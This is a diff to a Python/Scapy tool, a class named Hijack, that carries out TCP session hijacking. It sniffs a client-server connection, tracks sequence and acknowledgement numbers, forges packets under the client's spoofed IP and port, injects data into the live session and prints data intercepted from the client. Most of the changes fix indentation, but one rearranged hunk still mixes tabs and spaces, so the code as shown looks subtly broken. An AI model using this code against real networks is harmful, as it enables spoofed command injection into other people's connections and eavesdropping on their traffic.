@@ -15,7 +15,7 @@ class Hijack:
 
 		self.my_seq = 0
 		self.my_ack = 0
-        self.my_offset = 0
+		self.my_offset = 0
 		self.hijacked = False
 
 	def input_loop(self):
@@ -26,8 +26,8 @@ class Hijack:
 			if not self.hijacked:
 				continue
 
-            seq = self.my_seq + self.my_offset
-            self.my_offset += len(inject_data)
+			seq = self.my_seq + self.my_offset
+			self.my_offset += len(inject_data)
 			packet = IP(src=self.client_ip, dst=self.srv_ip) / TCP(sport=self.client_port, dport=self.srv_port, seq=seq, ack=self.my_ack, flags="PA") / inject_data
 			send(packet, iface=self.dev, verbose=False)
 
@@ -42,10 +42,10 @@ class Hijack:
 		#Check if this is a hijackable packet
 		if tcp.sprintf("%flags%") == "A" or tcp.sprintf("%flags%") == "PA":
 
-			#The packet is from server to client
-			if tcp.sport == self.srv_port and ip.src == self.srv_ip:
+            payload_len = len(packet.getlayer("Raw").load) if packet.haslayer("Raw") else 0
 
-				payload_len = len(packet.getlayer("Raw").load) if packet.haslayer("Raw") else 0
+            #The packet is from server to client
+			if tcp.sport == self.srv_port and ip.src == self.srv_ip:
 
 				if not self.hijacked:
 					self.client_ip = ip.dst
@@ -68,14 +68,14 @@ class Hijack:
 						ack_packet = IP(src=ip.dst, dst=ip.src) / TCP(sport=tcp.dport, dport=self.srv_port, seq=self.my_seq, ack=self.my_ack, flags="A")
 						send(ack_packet, iface=self.dev, verbose=False)
 
-            #The packet is from client to server
-            elif tcp.sport == self.client_port and ip.src == self.client_ip:
-                if payload_len > 0:
-                    self.my_seq += payload_len
-                    data = packet.getlayer("Raw").load if packet.haslayer("Raw") else b""
-                    print("Received from client: " + data.decode())
-                    ack_packet = IP(src=ip.dst, dst=ip.src) / TCP(sport=tcp.dport, dport=self.srv_port, seq=self.my_seq, ack=self.my_ack, flags="A")
-                    send(ack_packet, iface=self.dev, verbose=False)
+			#The packet is from client to server
+			elif tcp.sport == self.client_port and ip.src == self.client_ip:
+				if payload_len > 0:
+					self.my_seq += payload_len
+					data = packet.getlayer("Raw").load if packet.haslayer("Raw") else b""
+					print("Received from client: " + data.decode())
+					ack_packet = IP(src=ip.dst, dst=ip.src) / TCP(sport=tcp.dport, dport=self.srv_port, seq=self.my_seq, ack=self.my_ack, flags="A")
+					send(ack_packet, iface=self.dev, verbose=False)
 
 	def run(self):
 		if self.client_ip:
